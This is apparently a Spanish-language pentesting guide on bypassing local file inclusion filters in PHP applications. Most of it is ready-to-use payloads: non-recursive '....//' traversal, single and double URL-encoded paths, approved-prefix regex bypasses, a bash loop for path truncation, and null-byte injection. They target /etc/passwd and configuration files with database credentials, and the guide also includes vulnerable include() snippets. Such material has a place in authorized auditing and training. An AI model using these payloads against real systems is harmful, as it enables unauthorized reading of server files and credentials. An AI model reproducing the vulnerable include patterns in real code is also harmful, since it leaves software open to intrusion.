
Cuando una aplicación tiene controles anti-LFI, muchas veces no están bien implementados. Esta sección resume **cómo romper esos filtros típicos** para recuperar la inclusión de archivos.

---

# **1. Filtros que eliminan `../` (no recursivos)**

Muchos desarrolladores aplican un filtro muy simple:

```php
$param = str_replace('../', '', $_GET['file']);
```

Este filtro tiene un problema enorme: **solo se ejecuta una vez**.  
Si tu payload genera un `../` _después_ de la primera limpieza, el bypass funciona.

### 🔥 Ejemplo real

Si haces:

```
file=../../../../etc/passwd
```

Después del filtro queda:

```
languages/etc/passwd   (fallará)
```

Pero si envías:

```
file=....//....//etc/passwd
```

O sea:

- `....//` se convierte en `../` tras eliminar la primera aparición de `../`.
    
- Después la ruta final sí contiene traversals válidos.
    

✔ **Resultado:**  
Incluye `/etc/passwd` con éxito.

### Variantes útiles

Estas cadenas suelen funcionar en filtros no recursivos:

- `....//`
    
- `..././`
    
- `....\/`
    
- `....////`
    

La idea siempre es la misma: **crear un `../` posterior al filtro inicial**.

---

# **2. Bypass mediante URL Encoding (encoding simple o doble)**

Cuando la aplicación bloquea caracteres como `.` o `/`, podemos enviar la ruta codificada.  
El filtro ve `%2e%2e%2f` pero PHP la decodifica antes de `include()`.

### Payload codificado para `../`:

```
%2e%2e%2f
```

### Ejemplo práctico

```
?file=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Al decodificar:

```
../../etc/passwd
```

✔ **Bypass exitoso**, incluso en apps que bloquean `.`, `/` o `../`.

### Doble encoding

Si un filtro decodifica _una vez_ y bloquea el resultado, puedes enviar:

```
%25%32%65%25%32%65%25%32%66  (../ doblemente codificado)
```

---

# **3. Filtros que exigen rutas aprobadas**

Es común ver validaciones tipo:

```php
if (preg_match('/^\.\/lang\/.+$/', $_GET['file'])) {
    include($_GET['file']);
}
```

La aplicación _solo acepta_ rutas bajo `./lang/`.

### Bypass estándar

Empieza con la ruta aprobada y haz traversal después:

```
./lang/../../../../etc/passwd
```

El regex acepta el prefijo y no bloquea los `../` posteriores.

### Combinado con encoding o bypass recursivo

Si además bloquea `../`, se puede usar:

```
./lang/%2e%2e%2f%2e%2e%2fetc/passwd
```

o variantes como:

```
./lang/....//....//etc/passwd
```

---

# **4. Extensiones añadidas automáticamente (p. ej. `.php`)**

Muchos proyectos hacen algo así:

```php
include($_GET['page'] . ".php");
```

Esto impide incluir `/etc/passwd`, pero aún se puede:

### ✔ **Leer ficheros del servidor con esa extensión**

Por ejemplo:

```
?page=../../config/settings
```

→ carga `/config/settings.php`

Esto es útil para **leer código fuente**, credenciales de BD, etc.

### Técnicas antiguas (solo PHP < 5.3 / 5.4)

Aunque hoy son raras en producción, son oro en entornos legacy.

---

## **4.1. Path Truncation (truncado de rutas por límite de 4096 bytes)**

En versiones antiguas de PHP, las rutas demasiado largas se **cortaban**.  
Si haces una ruta de >4096 caracteres, el sufijo `.php` puede quedar cortado.

### Payload típico:

```
nonexistent/../../../etc/passwd/././././././… (repetir ~2048 veces)
```

Tras el truncado:

```
/etc/passwd
```

y **el `.php` final desaparece**.

Puedes generar la cadena automática:

```bash
echo -n "nonexistent/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

---

## **4.2. Null Byte Injection (`%00`) – Muy eficaz en PHP < 5.5**

Los null bytes (`%00`) cortan la cadena en bajo nivel:

### Ejemplo:

```
?page=/etc/passwd%00
```

PHP intentará incluir:

```
/etc/passwd%00.php
```

Pero como el null byte “cierra” la cadena internamente, lo que realmente usa es:

```
/etc/passwd
```

✔ Bypass perfecto del `.php`.

---

# **5. Notas útiles para pentesters**

- Los bypass no recursivos funcionan en **PHP, Python, Node, Java, Ruby**, etc.  
    (Cualquier lenguaje con filtros simplones es vulnerable.)
    
- Los bypass por encoding se evaden incluso en WAFs comerciales.
    
- El regex de “ruta aprobada” suele ser el bypass **más común** en auditorías reales.
    
- Path truncation + Null Byte son extremadamente potentes en entornos antiguos.
    
- Si la app combina filtros, **combina tú también técnicas**:  
    `prefijo válido + encoded traversal + extensión manipulada`.
    